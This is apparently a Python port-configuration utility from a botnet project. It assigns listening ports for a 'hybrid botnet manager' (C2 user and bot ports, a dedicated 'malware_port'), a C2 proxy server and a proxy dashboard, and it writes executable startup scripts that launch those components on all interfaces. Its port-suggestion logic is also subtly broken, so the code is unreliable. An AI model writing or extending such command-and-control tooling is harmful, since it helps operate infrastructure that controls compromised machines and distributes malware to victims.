#!/usr/bin/env python3
"""
PORT CONFIGURATION MANAGER
Quản lý cấu hình port để tránh xung đột giữa các hệ thống
"""

import json
import os
from typing import Dict

class PortConfigManager:
    def __init__(self):
        self.config_file = "port_config.json"
        self.default_configs = {
            "hybrid_botnet_manager": {
                "c2_host": "0.0.0.0",
                "c2_users_port": 22222,
                "c2_bots_port": 7777,
                "malware_port": 6666,
                "web_port": 5000,
                "description": "Hybrid Botnet Manager ports"
            },
            "c2_proxy_server": {
                "c2_host": "0.0.0.0",
                "c2_port": 7778,  # Changed to avoid conflict
                "proxy_port": 8080,
                "description": "C2 Proxy Server ports"
            },
            "proxy_dashboard": {
                "host": "0.0.0.0",
                "port": 5001,  # Changed to avoid conflict
                "description": "Proxy Web Dashboard port"
            },
            "integration_test": {
                "c2_host": "127.0.0.1",
                "c2_port": 7778,
                "proxy_port": 8080,
                "dashboard_port": 5001,
                "description": "Integration test ports"
            }
        }
        
    def load_config(self) -> Dict:
        """Load port configuration from file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"❌ Error loading config: {e}")
                return self.default_configs
        else:
            self.save_config(self.default_configs)
            return self.default_configs
            
    def save_config(self, config: Dict):
        """Save port configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            print(f"✅ Configuration saved to {self.config_file}")
        except Exception as e:
            print(f"❌ Error saving config: {e}")
            
    def get_ports(self, system: str) -> Dict:
        """Get ports for specific system"""
        config = self.load_config()
        return config.get(system, {})
        
    def set_ports(self, system: str, ports: Dict):
        """Set ports for specific system"""
        config = self.load_config()
        config[system] = ports
        self.save_config(config)
        
    def check_conflicts(self) -> Dict:
        """Check for port conflicts between systems"""
        config = self.load_config()
        conflicts = {}
        
        # Collect all ports
        all_ports = {}
        for system, ports in config.items():
            for port_name, port_value in ports.items():
                if isinstance(port_value, int) and 'port' in port_name.lower():
                    if port_value in all_ports:
                        if port_value not in conflicts:
                            conflicts[port_value] = []
                        conflicts[port_value].extend([all_ports[port_value], f"{system}.{port_name}"])
                    else:
                        all_ports[port_value] = f"{system}.{port_name}"
                        
        return conflicts
        
    def suggest_ports(self) -> Dict:
        """Suggest non-conflicting ports"""
        config = self.load_config()
        used_ports = set()
        
        # Collect currently used ports
        for system, ports in config.items():
            for port_name, port_value in ports.items():
                if isinstance(port_value, int) and 'port' in port_name.lower():
                    used_ports.add(port_value)
                    
        # Suggest new ports
        suggestions = {
            "hybrid_botnet_manager": {
                "c2_users_port": 22222,
                "c2_bots_port": 7777,
                "malware_port": 6666,
                "web_port": 5000
            },
            "c2_proxy_server": {
                "c2_port": 7778,
                "proxy_port": 8080
            },
            "proxy_dashboard": {
                "port": 5001
            }
        }
        
        # Find available ports
        base_ports = {
            "c2_bots": 7777,
            "c2_users": 22222,
            "malware": 6666,
            "web": 5000,
            "proxy": 8080
        }
        
        for port_type, base_port in base_ports.items():
            if base_port in used_ports:
                # Find next available port
                new_port = base_port + 1
                while new_port in used_ports:
                    new_port += 1
                suggestions["c2_proxy_server" if port_type == "c2_bots" else "proxy_dashboard" if port_type == "web" else "hybrid_botnet_manager"][f"{port_type}_port" if port_type != "c2_bots" else "c2_port" if port_type == "c2_bots" else "port"] = new_port
                
        return suggestions
        
    def print_port_summary(self):
        """Print port summary"""
        config = self.load_config()
        conflicts = self.check_conflicts()
        
        print("🔌 PORT CONFIGURATION SUMMARY")
        print("=" * 50)
        
        for system, ports in config.items():
            print(f"\n📋 {system.upper().replace('_', ' ')}:")
            for port_name, port_value in ports.items():
                if isinstance(port_value, int) and 'port' in port_name.lower():
                    conflict_indicator = " 🔴" if port_value in conflicts else " ✅"
                    print(f"  {port_name}: {port_value}{conflict_indicator}")
                    
        if conflicts:
            print(f"\n🔴 PORT CONFLICTS DETECTED:")
            for port, systems in conflicts.items():
                print(f"  Port {port}: {', '.join(systems)}")
        else:
            print(f"\n✅ NO PORT CONFLICTS")
            
    def generate_startup_scripts(self):
        """Generate startup scripts with correct ports"""
        config = self.load_config()
        
        # Generate hybrid botnet manager script
        hybrid_script = f"""#!/bin/bash
# Hybrid Botnet Manager Startup Script
echo "🚀 Starting Hybrid Botnet Manager..."
python3 bane/hybrid_botnet_manager.py \\
    --c2-host {config['hybrid_botnet_manager']['c2_host']} \\
    --c2-users-port {config['hybrid_botnet_manager']['c2_users_port']} \\
    --c2-bots-port {config['hybrid_botnet_manager']['c2_bots_port']} \\
    --malware-port {config['hybrid_botnet_manager']['malware_port']} \\
    --web-port {config['hybrid_botnet_manager']['web_port']}
"""
        
        # Generate C2 proxy server script
        proxy_script = f"""#!/bin/bash
# C2 Proxy Server Startup Script
echo "🚀 Starting C2 Proxy Server..."
python3 scripts/c2_proxy_server.py \\
    --c2-host {config['c2_proxy_server']['c2_host']} \\
    --c2-port {config['c2_proxy_server']['c2_port']} \\
    --proxy-port {config['c2_proxy_server']['proxy_port']}
"""
        
        # Generate proxy dashboard script
        dashboard_script = f"""#!/bin/bash
# Proxy Dashboard Startup Script
echo "🚀 Starting Proxy Dashboard..."
python3 scripts/proxy_web_dashboard.py \\
    --host {config['proxy_dashboard']['host']} \\
    --port {config['proxy_dashboard']['port']}
"""
        
        # Save scripts
        with open("start_hybrid_botnet.sh", "w") as f:
            f.write(hybrid_script)
        os.chmod("start_hybrid_botnet.sh", 0o755)
        
        with open("start_c2_proxy.sh", "w") as f:
            f.write(proxy_script)
        os.chmod("start_c2_proxy.sh", 0o755)
            
        with open("start_proxy_dashboard.sh", "w") as f:
            f.write(dashboard_script)
        os.chmod("start_proxy_dashboard.sh", 0o755)
            
        print("✅ Startup scripts generated:")
        print("  - start_hybrid_botnet.sh")
        print("  - start_c2_proxy.sh")
        print("  - start_proxy_dashboard.sh")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Port Configuration Manager")
    parser.add_argument("--check", action="store_true", help="Check for port conflicts")
    parser.add_argument("--suggest", action="store_true", help="Suggest non-conflicting ports")
    parser.add_argument("--generate", action="store_true", help="Generate startup scripts")
    parser.add_argument("--set", help="Set ports for system (format: system:port_name:port_value)")
    
    args = parser.parse_args()
    
    manager = PortConfigManager()
    
    if args.check:
        manager.print_port_summary()
        
    if args.suggest:
        suggestions = manager.suggest_ports()
        print("\n💡 SUGGESTED PORTS:")
        for system, ports in suggestions.items():
            print(f"\n{system}:")
            for port_name, port_value in ports.items():
                print(f"  {port_name}: {port_value}")
                
    if args.generate:
        manager.generate_startup_scripts()
        
    if args.set:
        try:
            system, port_name, port_value = args.set.split(":")
            port_value = int(port_value)
            manager.set_ports(system, {port_name: port_value})
            print(f"✅ Set {system}.{port_name} = {port_value}")
        except Exception as e:
            print(f"❌ Error setting port: {e}")

if __name__ == "__main__":
    main()
